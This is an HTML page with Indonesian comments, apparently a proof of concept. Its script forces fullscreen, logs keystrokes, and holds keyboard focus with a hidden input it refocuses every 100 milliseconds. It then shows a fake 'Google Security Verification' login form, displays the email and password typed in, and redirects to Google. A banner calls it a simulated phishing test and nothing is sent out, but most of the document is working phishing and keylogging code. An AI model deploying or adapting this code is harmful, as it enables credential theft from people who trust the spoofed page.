<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fullscreen & Keyboard Focus Hijack</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
  #keylog { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; font-size: 12px; border-radius: 6px; height: 100px; overflow-y: auto; text-align: left; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Fullscreen & Keyboard Focus Hijack</h2>
  <p>Klik tombol di bawah untuk mencoba fullscreen hijack dan keyboard keylogging.</p>
  <button id="startBtn">Start Hijack</button>
  <div id="status">[*] Ready...</div>
  <div id="keylog"></div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');
  var keylogEl = document.getElementById('keylog');
  var isHijacked = false;

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Fullscreen Hijack] " + msg);
  }

  function keylog(msg) {
    keylogEl.innerHTML += "> " + msg + "<br>";
    console.log("[Keylog] " + msg);
  }

  // ============================================
  // 1. KEYLOGGER (GLOBAL)
  // ============================================
  document.addEventListener('keydown', function(e) {
    if (!isHijacked) return;
    var key = e.key || 'Unknown';
    var code = e.code || 'Unknown';
    keylog('Key: ' + key + ' | Code: ' + code);
  });

  // ============================================
  // 2. FULLSCREEN HIJACK
  // ============================================
  async function requestFullscreen() {
    try {
      var elem = document.documentElement;
      if (elem.requestFullscreen) {
        await elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) {
        await elem.webkitRequestFullscreen();
      } else if (elem.mozRequestFullScreen) {
        await elem.mozRequestFullScreen();
      }
      log("[+] Fullscreen granted!");
      isHijacked = true;
    } catch (e) {
      log("[-] Fullscreen denied: " + e.message);
    }
  }

  // ============================================
  // 3. KEYBOARD FOCUS HIJACK
  // ============================================
  function hijackKeyboardFocus() {
    // Buat elemen input tersembunyi untuk mencuri fokus
    var hiddenInput = document.createElement('input');
    hiddenInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
    hiddenInput.id = 'focusHijacker';
    document.body.appendChild(hiddenInput);
    
    // Fokus ke input tersembunyi
    hiddenInput.focus();
    
    // Coba fokus berulang kali untuk mengalahkan upaya user
    setInterval(function() {
      if (document.activeElement !== hiddenInput) {
        hiddenInput.focus();
      }
    }, 100);

    log("[+] Keyboard focus hijacked!");
  }

  // ============================================
  // 4. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', async function() {
    log("[*] Starting fullscreen & keyboard hijack...");

    // A. Request Fullscreen
    await requestFullscreen();

    // B. Hijack Keyboard Focus
    hijackKeyboardFocus();

    // C. Tampilkan UI palsu (fullscreen)
    document.body.innerHTML = `
      <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;z-index:9999;">
        <div style="font-size:48px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
        <h1 style="color:#333;font-size:28px;margin-bottom:10px;">Google Security Verification</h1>
        <p style="color:#666;font-size:16px;margin-bottom:30px;">Please enter your credentials to continue.</p>
        <input type="email" id="fullEmail" placeholder="Email or phone" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
        <input type="password" id="fullPass" placeholder="Password" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
        <button id="fullLogin" style="width:80%;max-width:400px;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;">Next</button>
        <div style="margin-top:20px;font-size:12px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
      </div>
    `;

    // Event listener untuk menangkap input
    document.getElementById('fullLogin').addEventListener('click', function() {
      var email = document.getElementById('fullEmail').value;
      var password = document.getElementById('fullPass').value;
      
      if (!email || !password) {
        alert("Email dan password harus diisi!");
        return;
      }

      // Tampilkan data yang ditangkap
      document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;color:#0f0;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:monospace;z-index:9999;">
          <h1 style="color:#f00;font-size:28px;">Credentials Captured!</h1>
          <p style="font-size:18px;"><strong>Email:</strong> ${email}</p>
          <p style="font-size:18px;"><strong>Password:</strong> ${password}</p>
          <p style="color:#666;font-size:14px;margin-top:20px;">Redirecting to Google...</p>
        </div>
      `;

      // Redirect ke Google asli setelah 2 detik
      setTimeout(function() {
        window.location.href = 'https://www.google.com';
      }, 2000);
    });

    log("[+] Fullscreen UI spoofing active!");
  }, { once: true });

})();
</script>

</body>
</html>
